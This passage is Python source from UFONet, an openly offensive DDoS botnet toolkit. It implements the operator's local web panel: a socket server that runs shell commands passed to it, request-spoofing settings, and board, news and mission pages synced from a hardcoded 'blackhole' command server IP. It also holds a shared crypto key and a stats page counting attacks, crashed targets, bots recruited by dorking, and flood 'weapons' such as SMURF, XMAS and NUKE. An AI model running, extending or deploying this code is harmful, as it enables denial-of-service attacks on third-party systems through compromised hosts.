#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2020 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
#######WORKAROUND PYTHON(3) VERSIONS####################
import platform                                       
python_version = "python"+platform.python_version_tuple()[0]+"."+platform.python_version_tuple()[1] 
#######################################################

import socket, threading, re, os, time, random, base64
import webbrowser, subprocess, json, sys, requests
import urllib.request, urllib.error, urllib.parse
from urllib.parse import urlparse as urlparse
from core.tools.crypter import Cipher
from time import gmtime, strftime, strptime
from Crypto.Cipher import AES
from hashlib import sha1, sha256
from decimal import Decimal
from random import shuffle
from .options import UFONetOptions
from .main import UFONet
from core.tools.abductor import Abductor

#######SET-YOUR-BLACKHOLE-CONF-HERE###############################D
default_blackhole = '176.28.23.46' # default blackhole            #
crypto_key = "U-NATi0n!" # default enc/dec (+moderator board) key #
###################################################################

browser_init_page = "https://searchencrypt.com" # initial webpage for ship.browser [OK! 06/06/2020]
check_ip_service1 = 'https://checkip.org/' # set external check ip service 1 [OK! 06/06/2020]
check_ip_service2 = 'https://whatismyip.org/' # set external check ip service 2 [OK! 06/06/2020]
check_ip_service3 = 'https://ip.42.pl/ra' # set external check ip service 3 [OK! [06/06/2020]

blackhole_sep = "|" # blackhole stream separator
board_msg_sep = "#!#" # board stream separator
grid_msg_sep = "#?#" # grid stream seperator
wargames_msg_sep = "#-#" # wargames stream seperator
links_msg_sep = "#L#" # links stream separator
streams_msg_sep = "#S#" # streams stream separator
games_msg_sep = "#G#" # games stream separator
globalnet_msg_sep = "#$#" # globalnet stream separator

host = "0.0.0.0"
port = 9999

class ClientThread(threading.Thread):
    def __init__(self, ip, port, socket):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.socket = socket
        self.pages = Pages()

    def run(self):
        req = self.socket.recv(2048)
        res = self.pages.get(req)
        if res is None:
            self.socket.close()
            return
        out = "HTTP/1.0 %s\r\n" % res["code"]
        out += "Content-Type: %s\r\n\r\n" % res["ctype"]
        out += "%s" % res["html"]
        try:
            self.socket.send(out.encode('utf-8'))
        except:
            self.socket.send(out)
        self.socket.close()
        if "run" in res and len(res["run"]):
            subprocess.Popen(res["run"], shell=True)

class Pages():
    def file_len(self, fn):
        with open(fn) as f:
            for i, l in enumerate(f):
                pass
        return i + 1

    def html_army_map(self,target=None):
        try:
            target_js="total_zombies = "+str( int(self.file_len(self.zombies_file))+int(self.file_len(self.aliens_file))+int(self.file_len(self.droids_file))+int(self.file_len(self.ucavs_file))+int(self.file_len(self.rpcs_file))+int(self.file_len(self.ntps_file))+int(self.file_len(self.dnss_file))+int(self.file_len(self.snmps_file)) )+"\ninitMap()\n\n"
        except:
            target_js="not any zombie available\n\n"
        if target is not None:
            target_js += "$('#ufomsg').load('/js/ajax.js?doll="+target+"')\n"
        return self.pages["/header"] + """
  <link rel="stylesheet" href="/js/style.css" />
  <link rel="stylesheet" href="/js/ajaxmap.css" />
  <link rel="stylesheet" href="/js/leaflet/leaflet.css" />
  <link rel="stylesheet" href="/js/cluster/MarkerCluster.Default.css"/>
  <link rel="stylesheet" href="/js/cluster/MarkerCluster.css"/>
  <script src="/js/leaflet/leaflet.js"></script>
  <script src="/js/cluster/leaflet.markercluster-src.js"></script>
  <script src="/js/jquery-1.10.2.min.js"></script>
  <script src="/js/rlayer-src.js"></script>
  <script src="/js/raphael.js"></script>
  <script src="/js/ufo.js"></script>
  <script src="/js/ajax.js"></script>
</head><body bgcolor="black" text="black">
  <div id="wrapper">
      <div id="map" style="width: 100%; height: 100%"></div>
  </div>
<script type="text/javascript">
window.onload = function(){
"""+target_js+"""
}
  </script>
<center>
""" + self.pages["/footer"]      

    def html_request_submit(self):
        return self.pages["/header"]+"""<script>
window.setTimeout(window.close,1234)
</script></head><body bgcolor="black" text="yellow" style="font-family:Courier, 'Courier New', monospace;" >
<center>settings updated"""+self.pages["/footer"]

    def html_requests(self):
        # read requests configuration file (json)
        try:
            with open(self.mothership_webcfg_file) as data_file:    
                data = json.load(data_file)
        except:
            if os.path.exists(self.mothership_webcfg_file) == True:
                print('[Error] [AI] Cannot open: "core/json/webcfg.json" -> [Aborting!]\n')
                return
            else: # generate default requests configuration file
                print('[Info] [AI] Cannot found: "core/json/webcfg.json" -> [Generating!]')
                with open(self.mothership_webcfg_file, "w") as f:
                    json.dump({"rproxy": "NONE", "ruseragent": "RANDOM", "rreferer": "RANDOM", "rhost": "NONE", "rxforw": "on", "rxclient": "on", "rtimeout": "10", "rretries": "1", "rdelay": "0", "threads": "5", "rssl": "off"}, f, indent=4)
        # set values of requests configuration from json file to html form
        with open(self.mothership_webcfg_file) as data_file:
            data = json.load(data_file)
        self.agents = [] # generating available user-agents
        f = open(self.agents_file)
        agents = f.readlines()
        f.close()
        for agent in agents:
            self.agents.append(agent)
        self.user_agent = random.choice(self.agents).strip()
        self.rproxy = data["rproxy"]
        if self.rproxy == "NONE":
            self.rproxy = ""
        self.ruseragent = data["ruseragent"]
        if self.ruseragent == "RANDOM":
            self.ruseragent = self.user_agent # random user-agent
        self.rreferer = data["rreferer"]
        if self.rreferer == "RANDOM":
            self.rreferer = self.referer # random referer
        self.rhost = data["rhost"]
        if self.rhost == "NONE":
            self.rhost = ""
        self.rxforw = data["rxforw"]
        if self.rxforw == "on":
            self.rxforw_check = 'checked'
        else:
            self.rxforw_check = ''
        self.rxclient = data["rxclient"]
        if self.rxclient == "on":
            self.rxclient_check = 'checked'
        else:
            self.rxclient_check = ''
        self.rtimeout = data["rtimeout"]
        self.rretries = data["rretries"]
        self.rdelay = data["rdelay"]
        self.threads = data["threads"]
        self.rssl = data["rssl"]
        if self.rssl == "on":
            self.rssl_check = 'checked'
        else:
            self.rssl_check = ''
        return self.pages["/header"] + """
<script language="javascript"> 
function Requests() {
        var win_requests = window.open("requests","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" ><center><pre>
 <u>Configure requests:</u>
<table cellpadding="2" cellspacing="2">
<form method='GET'>
<tr>
 <td> Use proxy server:</td>
 <td> <input type="text" name="rproxy" value='"""+str(self.rproxy)+"""'></td>
</tr>
<tr>
 <td> Use another HTTP User-Agent header:</td>
 <td> <input type="text" name="ruseragent" value='"""+str(self.ruseragent)+"""'></td>
</tr>
<tr>
 <td> Use another HTTP Referer header:</td>
 <td> <input type="text" name="rreferer" value='"""+str(self.rreferer)+"""'></td>
</tr>
<tr>
 <td> Use another HTTP Host header:</td>
 <td> <input type="text" name="rhost" value='"""+str(self.rhost)+"""'></td>
</tr>
<tr>
 <td> Set your HTTP X-Forwarded-For with random IP values:</td>
 <td> <input type="checkbox" name='rxforw' """+self.rxforw_check+"""></td>
</tr>
<tr>
 <td> Set your HTTP X-Client-IP with random IP values:</td>
 <td> <input type="checkbox" name='rxclient' """+self.rxclient_check+"""></td>
</tr>
<tr>
 <td> Select your timeout:</td>
 <td> <input type="text" name="rtimeout" value='"""+str(self.rtimeout)+"""'></td>
</tr>
<tr>
 <td> Retries when the connection timeouts:</td>
 <td> <input type="text" name="rretries" value='"""+str(self.rretries)+"""'></td>
</tr>
<tr>
 <td> Delay in seconds between each HTTP request:</td>
 <td> <input type="text" name="rdelay" value='"""+str(self.rdelay)+"""'></td>
</tr>
<tr>
 <td> Number of threads:</td>
 <td> <input type="text" name="threads" value='"""+str(self.threads)+"""'></td>
</tr>
<tr>
 <td> Force usage of SSL/HTTPS requests:</td>
 <td> <input type="checkbox" name='rssl' """+self.rssl_check+"""></td>
</tr>
</table>
<hr>
<input type="hidden" name="update" value="1">
<input type="submit" value="Set!" onclick="Requests()"></pre>
</form>
""" + self.pages["/footer"]

    def html_board_profile_submit(self):
        return self.pages["/header"]+"""<script>
window.setTimeout(window.close,1234)
</script></head><body bgcolor="black" text="yellow" style="font-family:Courier, 'Courier New', monospace;" >
<center>Board profile updated. Re-enter to see changes..."""+self.pages["/footer"]

    def html_grid_profile_submit(self):
        return self.pages["/header"]+"""<script>
window.setTimeout(window.close,1234)
</script></head><body bgcolor="black" text="yellow" style="font-family:Courier, 'Courier New', monospace;" >
<center>Grid profile updated. Re-enter to see changes..."""+self.pages["/footer"]

    def profile_crew(self, icon):
        files = os.listdir("core/images/crew/")
        if icon == "NONE":
            icon = "link1"
        html_stream = ""
        html_stream += "<table cellspacing='2' cellpadding='5'><form method='GET'><tr>"
        for f in files:
            id = str(f.replace(".txt", ""))
            value = str(f.replace(".txt", ""))
            if icon == value:
                checked = " CHECKED"
            else:
                checked = ""
            crew_img = open("core/images/crew/"+value+".txt").read()
            html_stream += "<td><input type='radio' name='profile_icon' id='"+id+"' value='"+value+"'"+ checked+"><img src='data:image/png;base64,"+crew_img+"'></td>"
        html_stream += "</tr></table>"
        return html_stream

    def html_board_profile(self):
        try:
            with open(self.mothership_boardcfg_file) as data_file:    
                data = json.load(data_file)
        except:
            if os.path.exists(self.mothership_boardcfg_file) == True:
                print('[Error] [AI] Cannot open: "core/json/boardcfg.json" -> [Aborting!]\n')
                return
            else: 
                print('[Info] [AI] Cannot found: "core/json/boardcfg.json" -> [Generating!]')
                with open(self.mothership_boardcfg_file, "w") as f:
                    json.dump({"profile_token": "NONE", "profile_icon": "NONE", "profile_nick": "Anonymous"}, f, indent=4)
                f.close()
                with open(self.mothership_boardcfg_file) as data_file:
                    data = json.load(data_file)
        self.profile_token = str(random.getrandbits(128)) # generating random token hash 
        self.profile_icon = data["profile_icon"]
        self.profile_nick = data["profile_nick"]
        self.profile_nick.encode('utf-8')
        return self.pages["/header"] + """
<script language="javascript"> 
function BoardProfile() {
        var win_board = window.open("board_profile","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" ><center><pre>
 <u>Configure profile:</u>
<table cellpadding="2" cellspacing="2">
<form method='GET'>
<tr>
 <td> <u>OPERATOR/LINK:</u></td>
 <td> """+self.profile_crew(self.profile_icon)+"""</td>
</tr>
<tr>
 <td> <u>NICKNAME:</u></td>
 <td> <input type="text" name="profile_nick" pattern=".{3,12}" required title="3 to 12 characters" value='"""+self.profile_nick+"""'></td>
</tr>
</table>
<hr>
<input type="hidden" name="update" value="1">
<input type="submit" value="Set!" onclick="BoardProfile()"></pre>
</form>
""" + self.pages["/footer"]

    def html_grid_profile(self):
        try:
            with open(self.mothership_gridcfg_file) as data_file:    
                data = json.load(data_file)
        except:
            if os.path.exists(self.mothership_gridcfg_file) == True:
                print('[Error] [AI] Cannot open: "core/json/gridcfg.json" -> [Aborting!]\n')
                return
            else: 
                print('[Info] [AI] Cannot found: "core/json/gridcfg.json" -> [Generating!]')
                with open(self.mothership_gridcfg_file, "w") as f:
                    json.dump({"grid_token": "NONE", "grid_contact": "UNKNOWN!", "grid_nick": "Anonymous"}, f, indent=4)
                f.close()                
                with open(self.mothership_gridcfg_file) as data_file:
                    data = json.load(data_file)
        self.grid_token = str(random.getrandbits(128)) # generating random token hash 
        self.grid_contact = data["grid_contact"]
        self.grid_contact.encode('utf-8')
        self.grid_nick = data["grid_nick"]
        self.grid_nick.encode('utf-8')
        return self.pages["/header"] + """
<script language="javascript"> 
function GridProfile() {
        var win_board = window.open("grid_profile","_parent","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" ><center><pre>
 <u>Configure grid profile:</u><br>
<table cellpadding="2" cellspacing="2">
<form method='GET'>
<tr>
 <td> <u>NICKNAME:</u></td>
 <td> <input type="text" name="grid_nick" pattern=".{3,12}" required title="3 to 12 characters" value='"""+self.grid_nick+"""'></td>
</tr>
<tr>
 <td> <u>EMAIL/URL (CONTACT):</u></td>
 <td> <input type="text" name="grid_contact" pattern=".{8,120}" required title="8 to 120 characters" value='"""+self.grid_contact+"""'></td>
</tr>
</table>
<hr>
<input type="hidden" name="update" value="1">
<input type="submit" value="Set!" onclick="GridProfile()"></pre>
</form>
""" + self.pages["/footer"]

    def html_board_remove(self):
        try:
            with open(self.mothership_boardcfg_file, "w") as f:
                json.dump({"profile_token": "NONE", "profile_icon": "NONE", "profile_nick": "Anonymous"}, f, indent=4)
        except:
            return
        return self.pages["/header"]+"""<script>
window.setTimeout(window.close,1234)
</script></head><body bgcolor="black" text="yellow" style="font-family:Courier, 'Courier New', monospace;" >
<center>Board profile updated. Re-enter to see changes..."""+self.pages["/footer"]

    def html_grid_remove(self):
        try:
            with open(self.mothership_gridcfg_file, "w") as f:
                json.dump({"grid_token": "NONE", "grid_contact": "UNKNOWN!", "grid_nick": "Anonymous"}, f, indent=4)
        except:
            return
        return self.pages["/header"]+"""<script>
window.setTimeout(window.close,1234)
</script></head><body bgcolor="black" text="yellow" style="font-family:Courier, 'Courier New', monospace;" >
<center>Grid profile updated. Re-enter to see changes..."""+self.pages["/footer"]

    def html_stats(self):
        total_extra_attacks = int(self.aloic) + int(self.aloris) + int(self.aufosyn) + int(self.aspray) + int(self.asmurf) + int(self.axmas) + int(self.anuke) + int(self.atachyon) + int(self.amonlist) + int(self.afraggle) + int(self.asniper) + int(self.aufoack) + int(self.auforst) + int(self.adroper) + int(self.aoverlap) + int(self.apinger) + int(self.aufoudp)
        if self.ranking == "Rookie": # Rookie
            your_ranking = "<font color='white'>Rookie [*]</font>"
        elif self.ranking == "Mercenary": # Mercenary
            your_ranking = "<font color='cyan'>Mercenary [**]</font>"
        elif self.ranking == "Bandit": # Bandit 
            your_ranking = "<font color='blueviolet'>Bandit [***]</font>"
        elif self.ranking == "UFOmmander!": # UFOmmander!
            your_ranking = "<font color='blue'>UFOmmander! [****]</font>"
        elif self.ranking == "UFOl33t!": # UFOl33t!
            your_ranking = "<font color='red'>UFOl33t! [&#x25BC;]</font>"
        else:
            your_ranking = "<font color='yellow' size='4'>[-]</font> ( no0b! )" # no0b hacking attempt! ;-)
        return self.pages["/header"] + """<script language="javascript"> 
function Ranking() {
        var win_ranking = window.open("ranking","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Grid() {
        var win_grid = window.open("grid","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Board() {
        var win_board = window.open("board","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Links() {
        var win_links = window.open("links","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
function Streams() {
        var win_streams = window.open("streams","_parent","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
      }
</script></head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<center>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('CR1SPR-9-AI says: This is your ship, """ + self.ranking + """... Not bad, Eeeeh!?.');"><img src='data:image/png;base64,"""+self.mothership_img+"""'></a></td><td>
<td>STATS device: <font color='green'>ON</font><br><br><button title="Review stats from other motherships and share yours with them..." onclick="Grid()">VISIT GRID!</button> <button title="Visit ranking stats..." onclick="Ranking()">VISIT RANKING!</button> <br><br> <button title="Visit board panel..." onclick="Board()">VISIT BOARD!</button> <button title="Visit data links..." onclick="Links()">VISIT LINKS!</button> <button title="Visit TV.streams..." onclick="Streams()">VISIT STREAMS!</button></td>
</tr></table>
<table border="0" cellpadding="5" cellspacing="10"><tr><td>
<table border="1" cellpadding="5" cellspacing="10"><tr>
<td><b><u>General:</u></b></td></tr>
<tr>
<td>RANKING:</td><td align='right'>""" + str(your_ranking) + """</td></tr>
<tr><td>Flying (times):</td><td align='right'><font color='red'>""" + str(self.aflying) + """</font></td></tr>
</table>
<br>
<table border="1" cellpadding="5" cellspacing="10"><tr>
<td><b><u>Missions:</u></b></td></tr>
<tr>
<td>Created (launched):</td><td align='right'><font color='red'>""" + str(self.amissions) + """</font></td></tr>
<tr>
<td>Attacks (completed):</td><td align='right'><font color='blue'>""" + str(self.acompleted) + """</font></td></tr>
<tr>
<td>Targets (crashed):</td><td align='right'><font color='green'>""" + str(self.tcrashed) + """</font></td></tr>
<tr>
<td>Crashing (T*100/A=C%):</td><td align='right'><font color='orange'>""" + str(round(self.mothership_acc, 2)) + """%</font></td></tr>
</table>
</td><td>
<table border="1" cellpadding="5" cellspacing="10"><tr>
<td><b><u>Botnet:</u></b></td></tr>
<tr>
<td>Total Cargo (now):</td><td align='right'><a href='javascript:runCommandX("cmd_list_army")'>"""+ self.total_botnet +"""</a></td></tr>
<tr>
<td>Scanner (new bots via dorking):</td>
<td align='right'><font color='blue'>""" + str(self.ascanner) + """</font></td></tr>
<tr>
<td>Transferred (new bots via blackholes):</td>
<td align='right'><font color='green'>""" + str(self.atransferred) + """</font></td></tr>
<tr>
<td>Max. Chargo (always): </td><td align='right'><font color='orange'>""" + str(self.amax_chargo) + """</font></td></tr>
</table>
<br>
<table border="1" cellpadding="5" cellspacing="10"><tr>
<td><b><u>Weapons (use):</u></b></td></tr>
<tr>
<td>LOIC:</td><td align='right'><font color='cyan'>""" + str(self.aloic) + """</font></td>
<td>MONLIST:</td><td align='right'><font color='cyan'>""" + str(self.amonlist) + """</font></td>
<td>LORIS:</td><td align='right'><font color='cyan'>""" + str(self.aloris) + """</font></td></tr>
<tr>
<td>UFOSYN:</td><td align='right'><font color='cyan'>""" + str(self.aufosyn) + """</font></td>
<td>FRAGGLE:</td><td align='right'><font color='cyan'>""" + str(self.afraggle) + """</font></td>
<td>SPRAY:</td><td align='right'><font color='cyan'>""" + str(self.aspray) + """</font></td></tr>
<tr>
<td>SMURF:</td><td align='right'><font color='cyan'>""" + str(self.asmurf) + """</font></td>
<td>SNIPER:</td><td align='right'><font color='cyan'>""" + str(self.asniper) + """</font></td>
<td>XMAS:</td><td align='right'><font color='cyan'>""" + str(self.axmas) + """</font></td></tr>
<tr>
<td>NUKE:</td><td align='right'><font color='cyan'>""" + str(self.anuke) + """</font></td>
<td>UFOACK:</td><td align='right'><font color='cyan'>""" + str(self.aufoack) + """</font></td>
<td>TACHYON:</td><td align='right'><font color='cyan'>""" + str(self.atachyon) + """</font></td></tr>
<tr>
<td>UFORST:</td><td align='right'><font color='cyan'>""" + str(self.auforst) + """</font></td>
<td>DROPER:</td><td align='right'><font color='cyan'>""" + str(self.adroper) + """</font></td>
<td>OVERLAP:</td><td align='right'><font color='cyan'>""" + str(self.aoverlap) + """</font></td></tr>
<tr>
<td>PINGER:</td><td align='right'><font color='cyan'>""" + str(self.apinger) + """</font></td>
<td>UFOUDP:</td><td align='right'><font color='cyan'>""" + str(self.aufoudp) + """</font></td>
<td>TOTAL:</td><td align='right'><font color='red'>""" + str(total_extra_attacks) +"""</font></td>
</tr>
</table>
</td></tr></table>
<br><hr>
<div id="cmdOut"></div>
""" + self.pages["/footer"]

    def hmac_sha1(self, key, msg):
        if len(key) > 20:
            key = sha1(key).digest()
        key += chr(0).encode('utf-8') * (20 - len(key))
        o_key_pad = key.translate(self.trans_5C)
        i_key_pad = key.translate(self.trans_36)
        return sha1(o_key_pad + sha1(i_key_pad + msg).digest()).digest()

    def derive_keys(self, key):
        key = key.encode('utf-8')
        h = sha256()
        h.update(key)
        h.update('cipher'.encode('utf-8'))
        cipher_key = h.digest()
        h = sha256()
        h.update(key)
        h.update('mac'.encode('utf-8'))
        mac_key = h.digest()
        return (cipher_key, mac_key)

    def decrypt(self, key, text):
        KEY_SIZE = 32
        BLOCK_SIZE = 16
        MAC_SIZE = 20
        mode = AES.MODE_CFB
        try:
            iv_ciphertext_mac = base64.urlsafe_b64decode(text)
        except:
            try:
                padding = len(text) % 4
                if padding == 1:
                    return ''
                elif padding == 2:
                    text += b'=='
                elif padding == 3:
                    text += b'='
                iv_ciphertext_mac = base64.urlsafe_b64decode(text)
            except TypeError:
                return None
        iv = iv_ciphertext_mac[:BLOCK_SIZE]
        ciphertext = iv_ciphertext_mac[BLOCK_SIZE:-MAC_SIZE]
        mac = iv_ciphertext_mac[-MAC_SIZE:]
        (cipher_key, mac_key) = self.derive_keys(key)
        expected_mac = self.hmac_sha1(mac_key, iv + ciphertext)
        if mac != expected_mac:
            return None
        aes = AES.new(cipher_key, mode, iv)
        self.decryptedtext = aes.decrypt(ciphertext)
        try:
            self.decryptedtext = self.decryptedtext.decode('utf-8')
        except:
            pass

    def encrypt(self, key, text):
        try:
            key = base64.b64encode(str(key))
        except:
            key = base64.b64encode(key.encode('utf-8'))
        c = Cipher(key, text)
        msg = c.encrypt()
        try:
            msg = msg.decode('utf-8')
        except:
            pass
        c.set_text(msg)
        self.encryptedtext = str(msg)

    def html_news(self):
        return self.pages["/header"] + """<script language="javascript">
function Decrypt(){
        news_key=document.getElementById("news_key").value
        if(news_key == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="news_key="+escape(news_key)
         runCommandX("cmd_decrypt",params)
         document.getElementById("nb1").style.display = "none";
         }
      }
</script>
<script language="javascript">
function RefreshNews(){
        news_source=document.getElementById("news_source").value
        if(news_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="news_source="+escape(news_source)
         runCommandX("cmd_refresh_news",params)
         document.getElementById("nb1").style.display = "none";
         setTimeout("location.reload()", 10000)
         }
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center><table cellpadding="2" cellspacing="2"><tr><td><table cellpadding="5" cellspacing="5"><tr>
<td>Blackhole/IP:</td>
<td><input type="text" name="news_source" id="news_source" size="20" value='"""+default_blackhole+"""'></td> 
</tr></table></td><td><button title="Search for records on that blackhole..." onclick="RefreshNews()" style="color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;">Search News...</button></td></tr></table>
<hr>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('Psihiz says: """ + self.ranking + """... Welcome to the Crypto-News!...');"><img src='data:image/png;base64,"""+self.alien1_img+"""'></a></td><td>
<table cellpading="5" cellspacing="10"><tr><td>
<form method='GET'>
Your key: <input type="text" name="news_key" id="news_key" size="20" value='"""+str(self.crypto_key)+"""'>
</td></tr><tr><td>
<a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt();>Try decryption!</a>
</form>
</td></tr></table></td></tr></table>
<hr><br>
</center>
Last update: <font color='"""+ self.news_status_color + """'>"""+ self.news_datetime + """</font><br><br>
<div id="cmdOut"></div>
<div id="nb1" style="display: block;">"""+self.news_text+"""</div><br><br>
""" + self.pages["/footer"]

    def html_missions(self):
        return self.pages["/header"] + """<script language="javascript">
function Decrypt(){
        missions_key=document.getElementById("missions_key").value
        if(missions_key == "") {
          window.alert("You need to enter a valid key (provided by someone)");
          return
         }else{
          params="missions_key="+escape(missions_key)
         runCommandX("cmd_decrypt",params)
         document.getElementById("nb1").style.display = "none";
         }
      }
</script>
<script language="javascript">
function RefreshMissions(){
        missions_source=document.getElementById("missions_source").value
        if(missions_source == "") {
          window.alert("You need to enter a valid IP (with a 'blackhole' listening on).");
          return
         }else{
          params="missions_source="+escape(missions_source)
         runCommandX("cmd_refresh_missions",params)
         document.getElementById("nb1").style.display = "none";
         setTimeout("location.reload()", 10000)
         }
      }
</script>
</head><body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
<br>
<center><table cellpadding="2" cellspacing="2"><tr><td><table cellpadding="5" cellspacing="5"><tr>
<td>Blackhole/IP:</td>
<td><input type="text" name="missions_source" id="missions_source" size="20" value='"""+default_blackhole+"""'></td> 
</tr></table></td><td><button title="Search for records on that blackhole..." onclick="RefreshMissions()" style="color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;">Search missions...</button></td></tr></table>
<hr>
<table cellpadding="5" cellspacing="5"><tr>
<td><a href="javascript:alert('Mnahät says: """ + self.ranking + """... Welcome to the Crypto-Missions!...');"><img src='data:image/png;base64,"""+self.alien2_img+"""'></a></td><td>
<table cellpading="5" cellspacing="10"><tr><td>
<form method='GET'>
Your key: <input type="text" name="missions_key" id="missions_key" size="20" value='"""+str(self.crypto_key)+"""'>
</td></tr><tr><td>
<a style='color:red;text-decoration:underline red;' onclick=javascript:Decrypt();>Try decryption!</a>
</form>
</td></tr></table></td></tr></table>
<hr><br>
</center>
Last update: <font color='"""+ self.missions_status_color + """'>"""+ self.missions_datetime + """</font><br><br>
<div id="cmdOut"></div>
<div id="nb1" style="display: block;">"""+self.missions_text+"""</div><br><br>
""" + self.pages["/footer"]

    def html_board(self):
        self.board_welcome = "<div id='board_warning' style='display: none;'><pre><u>WARNING:</u> <br><br> 1) This is our 'Space Cantina': DON'T BE A LAMER!!! <br> 2) NO language RESTRICTIONS <br> 3) ABUSING == #HACKBACK (THIS IS NOT KIND OF FAME YOU WANT)<br> 4) CONTENT can be MODIFIED/REMOVED without notice<br> 5) LOVE, DONATIONS and REPORTS -> <a href='http://127.0.0.1:9999/help' target='_blank'>HERE</a></pre></div>" # board hardcoded warning (hehe)
        self.board_topic = "<select id='board_selector'><option value='general'>GENERAL</option><option value='opsec'> - OPSEC: #UFOSTORM</option><option value='faq'>UFONET/FAQ</option><option value='bugs'>UFONET/BUGS</option><option value='media'>UFONET/MEDIA</option></select>"
        self.board_send_msg = "<button title='Send your message to the Board (REMEMBER: you will cannot remove it!)...' onclick='SendMessage()'>SEND IT!</button>"
        if '"profile_token": "NONE"' in open(self.mothership_boardcfg_file).read():
            device_state = "OFF"
            device = "BOARD device: <font color='red'>OFF</font><br>"
        else:
            device_state = "ON"
            self.moderator_text = ''.join(random.sample(self.moderator_text,len(self.moderator_text)))
            boardcfg_json_file = open(self.mothership_boardcfg_file, "r") # extract mothership boardcfg
            data = json.load(boardcfg_json_file)
            boardcfg_json_file.close()
            profile_token = data["profile_token"]
            profile_icon = data["profile_icon"]
            profile_nick = data["profile_nick"]
            self.profile_nick.encode('utf-8')
            operator_img = open("core/images/crew/"+profile_icon+".txt").read()
            device = "<u>OPERATOR/LINK:</u> <font color='green'>ON</font><br><table cellpadding='5'><tr><td><img src='data:image/png;base64,"+operator_img+"'></td></tr><tr><td> -NICKNAME: "+str(self.profile_nick)+"</td></tr><tr><td> -ID: "+str(profile_token)+"</td></tr></table>"
        if device_state == "OFF":
            board_filter = ""
        else:
            board_filter = "<table cellpadding='5' border='1'><tr><td><input type='radio' name='filter' id='filter_all' value='ALL' CHECKED>/ALL<br> </td><td><input type='radio' name='filter' id='filter_general' value='GENERAL'>/GENERAL</td><td><input type='radio' name='filter' id='filter_opsec' value='OPSEC'>/#OPSEC<br> </td><td><input type='radio' name='filter' id='filter_faq' value='FAQ'>/FAQ</td><td><input type='radio' name='filter' id='filter_bugs' value='BUGS'>/BUGS</td><td><input type='radio' name='filter' id='filter_media' value='MEDIA'>/MEDIA</td></tr></table>"
        if device_state == "OFF":
            sync_panel = ""
        else:
            sync_panel = "<table cellpadding='2' cellspacing='2'><tr><td><table cellpadding='5' cellspacing='5'><tr><td>Blackhole/IP:</td><td><input type='text' name='board_source' id='board_source' size='20' value='"+default_blackhole+"'></td></tr></table></td><td><button title='Search for records on that blackhole...' onclick='SyncBoard()' style='color:yellow; height:40px; width:200px; font-weight:bold; background-color:red; border: 2px solid yellow;'>Sync device...</button></td></tr></table><br><hr>"
        if device_state == "OFF":
            board_panel = ""
        else:
            with open(self.board_file) as f:
                for line in f:
                    line = line.strip()
                    self.board_warning += "\n" + " " + line + " " + "\n"
            f.close()
            self.moderator_text = re.sub("(.{100})", "\\1\n", self.moderator_text, 0, re.DOTALL) # regex magics! (set visual stream to 100 chars after \n)
            l = time.ctime(os.path.getmtime(self.board_file)) # get last modified time
